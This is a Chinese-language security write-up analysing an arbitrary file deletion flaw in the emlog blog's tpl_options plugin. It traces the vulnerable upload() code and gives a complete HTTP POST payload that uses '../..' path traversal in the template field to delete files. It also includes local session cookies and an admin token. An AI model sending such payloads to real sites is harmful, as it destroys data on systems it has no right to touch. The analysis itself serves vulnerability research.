## 任意文件删除 tpl_options.php

### 调试分析

漏洞文件在`content\plugins\tpl_options\tpl_options.php`的`upload()`方法
```php
 private function upload($template, $file, $target)
    {
        $result = array(
            'code' => 0,
            'msg'  => '',
            'name' => $file['name'],
            'size' => $file['size'],
            'path' => '',
        );
        if ($file['error'] == 1) {
            $result['code'] = 100;
            $result['msg'] = '文件大小超过系统限制';
            return $result;
        }

        if ($file['error'] > 1) {
            $result['code'] = 101;
            $result['msg'] = '上传文件失败';
            return $result;
        }
        $extension = getFileSuffix($file['name']);
        if (!in_array($extension, $this->_imageTypes)) {
            $result['code'] = 102;
            $result['msg'] = '错误的文件类型';
            return $result;
        }
        $maxSize = defined(UPLOAD_MAX_SIZE) ? UPLOAD_MAX_SIZE : 2097152;

        if ($file['size'] > $maxSize) {
            $result['code'] = 103;
            $result['msg'] = '文件大小超出系统限制';
            return $result;
        }
        $uploadPath = Option::UPLOADFILE_PATH . self::ID . "/$template/";

        $file_baseName = rtrim(str_replace(array(
            '[',
            ']'
        ), '.', $target), '.');

        $fileName = $file_baseName . '_' . uniqid() . '.' . $extension;
        $exists_files = glob($uploadPath . $file_baseName . '*');
        if (count($exists_files)) {
            unlink($exists_files[0]);
        }

        $attachpath = $uploadPath . $fileName;
        $result['path'] = $attachpath;
        if (!is_dir($uploadPath)) {
            @umask(0);
            $ret = @mkdir($uploadPath, 0777, true);
            if ($ret === false) {
                $result['code'] = 104;
                $result['msg'] = '创建文件上传目录失败';
                return $result;
            }
        }
        if (@is_uploaded_file($file['tmp_name'])) {
            if (@!move_uploaded_file($file['tmp_name'], $attachpath)) {
                $result['code'] = 105;
                $result['msg'] = '上传失败。文件上传目录(content/uploadfile)不可写';
                return $result;
            }
            @chmod($attachpath, 0777);
        }
        return $result;
    }

```

我们追踪寻找发现`setting()`方法调用了`upload()`，并且`$template`,`$target`俩参数都可传参控制
```php
 public function setting()
    {
        $do = $this->arrayGet($_GET, 'do');

        $template = $this->arrayGet($_GET, 'template');

        $code = $this->arrayGet($_GET, 'code');

        $msg = $this->arrayGet($_GET, 'msg');

        $allTemplate = $this->getTemplates();

        if ($do != '') {

            if ($do == 'upload' && isset($_FILES['image'])) {

                $file = $_FILES['image'];

                $target = $this->arrayGet($_POST, 'target');

                $template = $this->arrayGet($_POST, 'template');

                $result = $this->upload($template, $file, $target);

                extract($result);

                $src = '';

                if ($path) {

                    $path = substr($path, 3);

                    $src = BLOG_URL . $path;

                }

                ob_clean();

                include $this->view('upload');

                exit;
            }
            emDirect('./template.php');
        }
```

setting函数在`content\plugins\tpl_options\tpl_options_setting.php`中调用
```php
function plugin_setting_view() {

    TplOptions::getInstance()->setting();

}
```

继续追踪plugin_setting_view函数在`admin\plugin.php`中被调用，前提需要传参pugin为`tpl_options`来包含这个php文件才可以调用函数
```php
/ Load plug-in configuration page

if (empty($action) && $plugin) {

    $a = "../content/plugins/$plugin/{$plugin}_setting.php";

    require_once "../content/plugins/$plugin/{$plugin}_setting.php";

    include View::getAdmView('header');

    plugin_setting_view();

    include View::getAdmView('footer');

}
```

其中漏洞关键在`upload()`方法的这段代码：
```php
 $uploadPath = Option::UPLOADFILE_PATH . self::ID . "/$template/";

        $file_baseName = rtrim(str_replace(array(
            '[',
            ']'
        ), '.', $target), '.');

        $fileName = $file_baseName . '_' . uniqid() . '.' . $extension;
        $exists_files = glob($uploadPath . $file_baseName . '*');
        if (count($exists_files)) {
            unlink($exists_files[0]);
        }
```
使用 `glob()` 函数在指定的目录（`$uploadPath`）中查找所有匹配 `$file_baseName` 前缀的文件。`*` 表示通配符，查找所有以 `$file_baseName` 为开头的文件。然后删除匹配到的第一个文件。

其中变量`template`和`target`是用户可控的传参，之后经过拼接，那么我们可以目录穿越来删除任意文件。我们构造target为空或者某个字符，就可以匹配到文件。
### 漏洞攻击
我们先在content下创建一个`secret.txt
![png](./public/2-1.png)`

那么我们可以构造payload，让template为`../..`穿越两层目录到content，然后target为首字母s即可匹配到`secret.txt`:
```http
POST /emlog/admin/plugin.php?plugin=tpl_options&token=f84d7b2cb44f1c6839816ca0f028ef1a35d66d2e&filter=&do=upload HTTP/1.1


Content-Disposition: form-data; name="target"

s
-----------------------------26132868467189384564220341836
Content-Disposition: form-data; name="template"

../..
```
注意：需要管理员token

完整http包如下
```http
POST /emlog/admin/plugin.php?plugin=tpl_options&token=f84d7b2cb44f1c6839816ca0f028ef1a35d66d2e&filter=&do=upload HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------26132868467189384564220341836
Content-Length: 569
Origin: http://localhost
Connection: close
Cookie: XDEBUG_SESSION=AFCC; csrftoken=N1K4gile3UYv5N2MXM1ShwrrDTIW4JlfeGUS9a3XNzAxoXvHZ3itSuzzfFW4qdo8; devicePixelRatio=2; Phpstorm-db9a8415=b6480a2a-df8b-4049-b957-2723e5e1ad60; EM_AUTHCOOKIE_Is4qa70oOAoxVSN06kHCjdfvPUF6AvMI=admin%7C1768614317%7Cbce91a6d0efcfa837abca98d5feac895; PHPSESSID=uj9b3lutm7ddq4u6a9jctmtgr6
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

-----------------------------26132868467189384564220341836
Content-Disposition: form-data; name="image"; filename="1.png"
Content-Type: image/png

�PNG

-----------------------------26132868467189384564220341836
Content-Disposition: form-data; name="submit"

提交
-----------------------------26132868467189384564220341836
Content-Disposition: form-data; name="target"


-----------------------------26132868467189384564220341836
Content-Disposition: form-data; name="template"

../..
-----------------------------26132868467189384564220341836--

```
抓包调试，成功匹配到`secret.txt`进行unlink
![png](./public/2-2.png)
最后成功删除`secret.txt`
![png](./public/2-3.png)
